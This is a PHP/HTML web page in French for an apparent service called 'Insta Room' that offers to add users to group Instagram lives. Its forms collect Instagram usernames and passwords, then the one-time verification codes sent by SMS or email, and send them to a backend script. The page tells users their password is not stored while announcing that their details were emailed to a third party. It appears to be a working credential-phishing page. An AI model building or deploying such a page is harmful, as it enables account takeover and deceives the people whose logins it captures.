<!-- W3hubs.com - Download Free Responsive Website Layout Templates designed on HTML5 CSS3,Bootstrap which are 100% Mobile friendly. w3Hubs all Layouts are responsive cross browser supported, best quality world class designs. -->
<?php
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS");
 header("Access-Control-Allow-Headers: Origin, Content-Type, X-Auth-Token");
 ?>
<!DOCTYPE html>
<html>
<head>
	<title>Instaroom</title>
	<meta charset="utf-8">
	<meta name="description" content="w3hubs.com">
  <meta name="author" content="w3hubs.com">
	<meta name="viewport" content="width=device-width, initial-scale=1">

	<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="assets/style.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<div class="container-fluid h-100">
	<div class=" row h-100 justify-content-center align-items-center">
		<div class="col-12 col-sm-12 col-md-5 col-lg-5" style="margin-top: 20vh;">

			<img src="assets/img/picture_1_iphone_room_india.jpg" alt="">

		</div>
		<div class="col-12 col-sm-12 col-md-7 col-lg-7 homepage" >
			<div class="d-flex justify-content-center">
				<img src="assets/img/image.png" alt="" width="260" height="67">
			</div>
			<div style="margin-top: 5vh;">
					<p><strong>INSTA ROOM</strong>  vous permet de</p>
					<p>participer à des lives sur Instagram en groupe.</p><br>
					
					<p>Pour participer, vous devez fournir à L’organisateur du live auquel vous</p>
					<p>souhaitez participer : une clé de stream Instagram et une URL RTMP.</p><br>
					
					<p style="font-size: 17px;"><strong>Ça ne prend qu’une minute,</strong></p>
					<p style="font-size: 17px;"><strong>et c’est simple, gratuit et automatique.</strong></p>
			</div><br><br>
			<div class="d-flex justify-content-center">
				<button type="button" class="btn btn-danger btn-tologin">COMMENCER</button>
			</div>
		</div>
		<div class="col-12 col-sm-12 col-md-7 col-lg-7 loginpage">
			<p><strong>CONNECTEZ-VOUS À VOTRE COMPTE INSTAGRAM</strong></p><br>
			<form id="instaform" action="itsagramlive/instalogin.php">  <!-- You can change the action URL here -->
				<div class="form-group">
				  <label>Nom d’utilisateur</label>
				  <input type="text" class="form-control" name="instausername" value="" required>
				  <label>Mot de passe</label>
				  <input id="instapassword" type="password" class="form-control" name="instapassword" value="" required>
				</div><br>
				<span id="instaloginfailed" style="color: red;">
					<p style="margin-bottom: 2px;">Le nom d'utilisateur que vous avez entré ne semble</p>
					<p style="margin-bottom: 2px;">pas appartenir à un compte. Veuillez vérifier votre</p>	 
					<p>nom d'utilisateur et réessayer.</p>	 
				</span>
				<div class="d-flex justify-content-center">
					<button id="btn_login" type="submit" class="btn btn-danger" >CONNEXION</button>
				</div>
			</form>
			
			<p>Nous ne stockons pas votre mot de passe.</p>
			<a href="#"><p style="color: #DD2A7B;">Conditions et confidentialité</p></a>
		</div>
		<div class="col-12 col-sm-12 col-md-7 col-lg-7 endingpage" >
			<div style="margin-top: 5vh;">
					<p style="color: red;"><strong>LA CLÉ DE STREAM ET L’URL RTMP ONT ÉTÉ GÉNÉRÉ !</strong></p>
					<p>participer à des lives sur Instagram en groupe.</p><br>
					
					<p>L’ensemble des informations ont été envoyé pa</p>
					<p>email à afs@sports-elites.com qui est</p><br>
					<p>l’organisateur du  <strong>LIVE INSTAGRAM.</strong></p><br><br>
					
					<p style="font-size: 17px;"><strong>L’équipe technique de InstaFootball prend contact</strong></p>
					<p style="font-size: 17px;"><strong>avec vous pour vous intégrer à son live Instagram.</strong></p>
			</div><br><br>
			<div class="d-flex justify-content-center">
				<button type="button" class="btn btn-danger btn-ending">CLIQUEZ-ICI POUR VOUS DÉCONNECTER</button>
			</div>
		</div>

		    <!-- Modal on the static page -->
		<div id="modal-age-verification" class="modal fade">
			<div class="modal-dialog" style="z-index:9999;">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title">ATTENTION:</h5>
						<button type="button" class="close" data-dismiss="modal">&times;</button>
					</div>
					<div class="modal-body">
						<p>EN RAISON DE LA CONFIRMATION DU COMPTE, LE MODE CHALLENGE EST REQUIS!</p>
						<form id="verification_form" class="was-validated" action="itsagramlive/instalogin.php">
							<div class="col-md-12">
								<div id="form_getchallengemode">
									<div class="form-group row">
										<div class="col-md-8"><input type="radio" id="radio_sms" class="form-control" name="getchallengemode" value="0"/></div> 
										<div class="col-md-4 d-flex"><label class="control-label justify-content-center align-self-center">SMS </label></div>
									</div>
									<div class="form-group row">
										<div class="col-md-8"><input type="radio" id="radio_email" class="form-control" name="getchallengemode" value="1" checked/></div> 
										<div class="col-md-4 d-flex"><label class="control-label justify-content-center align-self-center">Email </label></div>
									</div>
								</div>    
								<div id="form_setchallengecode">								
									<div class="form-group row">
										<div class="col-md-12 d-flex"><label class="control-label justify-content-center align-self-center">ENTRER LE CODE REÇU PAR EMAIL: </label></div>
										<div class="col-md-12"><input type="text" id="challengecode" class="" name="setchallengcode" /></div> 
									</div>
								</div>                        
							</div>   
					</div>
					<div class="modal-footer">
						<button type="submit" class="btn btn-primary" id="wish_to_verify">SOUHAITEZ VÉRIFIER</button></form>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>

<!-- <script async src="https://www.googletagmanager.com/gtag/js?id=UA-125951040-1"></script> -->
<script>
	$( document ).ready(function() {
		$("#instaloginfailed").prop('hidden', true);
		$(".loginpage").prop('hidden', true);
		$(".endingpage").prop('hidden', true);
		
	});
	$(".btn-tologin").click(function(){
		$(".loginpage").prop('hidden', false);
		$(".homepage").prop('hidden', true);

		//JUST FOR TEST IN CHALLENGE MODE
		// $("#form_getchallengemode").prop('hidden', false);
		// $("#form_setchallengecode").prop('hidden', true);
		// $('#modal-age-verification').modal({backdrop: 'static', keyboard: false}) 
		// $("#modal-age-verification").modal("show"); 

	})
	$(".btn-ending").click(function(){
		$(".btn-ending").prop('disabled', true);
		$.ajax({
			type: "POST",
			url: "itsagramlive/instalogin.php", // You can change the action URL here
			dataType: 'json',
			data: {'stop': 'yes'},
			success: function(result) {
				$(".btn-ending").prop('disabled', false);
				if(result.status == 'success'){
					// alert(result.contents);
					alert('Live Stream Stopped!');
					console.log(result.contents);
					$(".endingpage").prop('hidden', true);
					$(".homepage").prop('hidden', false);
				}
			},
			error: function(result) {
				console.log(result.status);
				alert('Sorry but Server issue!');
				$(".btn-ending").prop('disabled', false);
			}
		})
		
	})
	$("#instaform").submit(function(e) {

		e.preventDefault();

		var actionurl = e.currentTarget.action;
		var btn_submit = $(this).find(':button[type=submit]');
		btn_submit.prop('disabled', true);
		btn_submit.html('CONNEXION EN COURS ....');

		var formserial = $(this).serialize();
		console.log(formserial);
		$.ajax({
			type: "POST",
			url: actionurl, // You can change the action URL here
			dataType: 'json',
			data: formserial,
			success: function(result) {
				btn_submit.prop('disabled', false);
				btn_submit.html('CONNEXION');

				if(result.status == 'success'){
					alert((result.contents) );
					console.log(result.contents);
					$("#instaloginfailed").prop('hidden', true);

					$(".loginpage").prop('hidden', true);
					$(".endingpage").prop('hidden', false);

				} else if(result.status == 'loginfailed'){
					
					$("#instaloginfailed").prop('hidden', false);
					$("#instapassword").css('border', '2px solid red');

				} else if(result.status == 'challenge'){

					$("#form_getchallengemode").prop('hidden', false);
					$("#form_setchallengecode").prop('hidden', true);
					$('#modal-age-verification').modal({backdrop: 'static', keyboard: false}) 
        			$("#modal-age-verification").modal("show"); 
					
				}
			},
			error: function(result) {
				console.log(result.status);
				alert("Server error! Try again after a few minutes.");
				btn_submit.prop('disabled', false);
				btn_submit.html('CONNEXION');
			}
		})
	});
	$("#verification_form").submit(function(e){
            
        e.preventDefault();

		var actionurl = e.currentTarget.action;
		var btn_submit = $(this).find(':button[type=submit]');
		btn_submit.prop('disabled', true);
		btn_submit.html('CONNEXION EN COURS ....');

		var formserial = $(this).serialize();
		console.log(formserial);
		$.ajax({
			type: "POST",
			url: actionurl, // You can change the action URL here
			dataType: 'json',
			data: formserial,
			success: function(result) {

				if(result.status == 'getsuccess'){
					// alet(result.contents);
					console.log(result.contents);
					$("#form_getchallengemode").prop('hidden', true);
					$("#form_setchallengecode").prop('hidden', false);
					$("#form_setchallengecode").prop('required', true);
					btn_submit.html('Confirm');
				} else if(result.status == 'setsuccess'){
					// alert(result.status);
					$("#modal-age-verification").modal("hide"); 
				}
			},
			error: function(result) {
				console.log(result.status);
				alert("Server error! Try again after a few minutes.");
				btn_submit.prop('disabled', false);
				btn_submit.html('SOUHAITEZ VÉRIFIER');
			}
		})
            // $("#modal-age-verification").modal("hide");
            
    });
</script>
<!-- <script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-125951040-1');
</script> -->
</body>
</html>